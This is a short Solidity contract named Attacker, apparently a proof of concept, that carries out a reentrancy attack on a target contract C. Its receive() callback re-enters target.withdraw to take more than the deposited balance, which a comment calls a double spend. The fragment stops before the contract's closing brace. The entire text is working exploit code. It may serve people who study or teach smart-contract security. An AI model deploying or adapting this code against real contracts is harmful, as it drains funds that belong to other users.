contract Attacker {
    C target;
    bool private reenter;

    constructor(address _target) { target = C(_target); }

    function deposit() external payable { target.deposit{value: msg.value}(); }

    function initiateWithdraw(uint256 amount) external {
        reenter = true;
        target.withdraw(amount);
    }

    receive() external payable {
        if (reenter && address(target).balance > 0) {
            reenter = false;
            // Re-enter withdraw with minimal amount to demonstrate double spend
            uint256 steal = address(target).balance < target.balances(address(this)) ? address(target).balance : target.balances(address(this));
            if (steal > 0) {
                target.withdraw(steal);
            }
        }
    }
